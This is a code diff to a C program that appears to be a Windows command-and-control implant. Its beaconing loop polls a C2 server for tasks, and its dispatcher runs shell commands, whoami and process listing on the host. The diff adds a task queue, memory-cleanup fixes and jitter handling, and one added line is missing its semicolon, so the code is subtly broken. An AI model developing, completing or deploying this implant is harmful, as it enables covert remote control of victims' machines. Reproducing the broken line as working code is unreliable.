@@ -15,6 +15,73 @@
 #include "cJSON.h"
 #include "base64.h"
 
+typedef cJSON* task_t;
+
+//QUEUE START
+#define MAX_SIZE 100
+typedef struct Queue Queue;
+struct Queue {
+task_t items[MAX_SIZE];
+unsigned int front;
+unsigned int rear;
+short size;
+} q;
+
+void init_queue(Queue *q){
+q->rear = 0;
+q->front = 0;
+q->size = 0;    
+}
+
+static inline bool isEmpty(Queue *q) {
+    return q->size == 0;
+}
+
+static inline bool isFull(Queue *q) {
+    return q->size==MAX_SIZE;
+}
+
+void enqueue(Queue *q, task_t val){
+    if(isFull(q)){
+        printf("queue full :(\n");
+        return;
+    }   
+    q->items[q->rear] = val;
+    q->rear = (q->rear+1)%MAX_SIZE;
+    q->size++;
+    return;
+}
+
+task_t dequeue(Queue *q){
+    if(isEmpty(q)){
+        printf("queue empty :(\n");
+        return 0;
+    }
+    task_t ret = q->items[q->front];
+    q->front = (q->front + 1) %MAX_SIZE;
+    q->size--;
+    return ret;
+}
+void del_task(Queue *q){
+    if(isEmpty(q)){
+        printf("queue empty :(\n");
+        return;
+    }
+    q->front = (q->front + 1) %MAX_SIZE;
+    q->size--;
+}
+
+task_t peek(Queue *q){
+if(isEmpty(q)){
+        printf("queue empty :(\n");
+        return 0;
+    }
+
+return q->items[q->front];
+}
+//QUEUE END
+
+
 char* handle_shell_cmd(cJSON *task);
 void dispatcher(cJSON *task);
 bool sleep_with_jitter(int interval, int jitter);
@@ -108,7 +175,7 @@ char* send_c2_post_request(char* json_data) {
     
     if (HttpSendRequest(hRequest, headers, -1, to_be_send, strlen(to_be_send))) {
         printf("wysłano post'a\n");
-        free(to_be_send);
+        
         char buffer[12000];
         DWORD bytesRead;
         if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
@@ -122,6 +189,7 @@ char* send_c2_post_request(char* json_data) {
             
         }
     }
+    free(to_be_send);
 return NULL;
 }
 void checkin(){
@@ -149,9 +217,10 @@ if (root != NULL) {
 cJSON *tasks = cJSON_GetObjectItemCaseSensitive(root, "tasks");
 if(cJSON_IsArray(tasks)){
 cJSON *task = NULL;
-
 cJSON_ArrayForEach(task,tasks){
-    dispatcher(task);
+    //dispatcher(task);
+    cJSON* d_task = cJSON_Duplicate(task,1);
+    enqueue(&q, d_task);
                               }
 
                        }
@@ -180,6 +249,7 @@ size_t read;
     fclose(fp);
 
 char* ret_val = (char*)calloc(1,read+1);
+output[read] = '\0'
 strncpy(ret_val,output,read+1);
 return ret_val;
 }
@@ -214,11 +284,7 @@ char* handle_whoami_cmd(/*cJSON *task*/){
 
 }
 
-//typedef struct ProcessInfo{
-//    char szExeFile[260];
-//    int th32ParentProcessID;
-//    int th32ProcessID;
-//};
+
 
 void dispatcher(cJSON *task){
     char* command_output;
@@ -234,10 +300,12 @@ void dispatcher(cJSON *task){
     }
     else if (!(strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"ps"))){
          handle_ps_cmd(task);
+         cJSON_Delete(task);
          return;
     } else{
         printf(":( unknown command:\n");
             puts(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring);
+            cJSON_Delete(task);
    return;
 
     };
@@ -259,7 +327,7 @@ void dispatcher(cJSON *task){
         free(command_executed);
         free(command_output);
         cJSON_Delete(root);
-    
+        cJSON_Delete(task);
 
     
    return;
@@ -335,6 +403,7 @@ cJSON_AddStringToObject(user_input_p,"user_output",buff);
             buff[0] = '\0';
 
 }
+cJSON_Delete(user_input_p);
 cJSON *statusik = cJSON_GetObjectItemCaseSensitive(obj,"status");
 cJSON_SetValuestring(statusik,"success");
 cJSON *completed = cJSON_GetObjectItemCaseSensitive(obj,"completed");
@@ -350,12 +419,16 @@ return;
 }
 
 int main(){
-	checkin();
+
+    init_queue(&q);
+    checkin();
 //main loop
 abc:
-
+        if (!isEmpty(&q)){
+        dispatcher(dequeue(&q));
+    }
         get_tasks();
-        sleep_with_jitter(config.interval,config.jitter);
+        sleep_with_jitter(config.interval,config.jitter); //jitter also activates between every task completion - idk if i like it, but let's skip that for a moment
 
 goto abc;
 
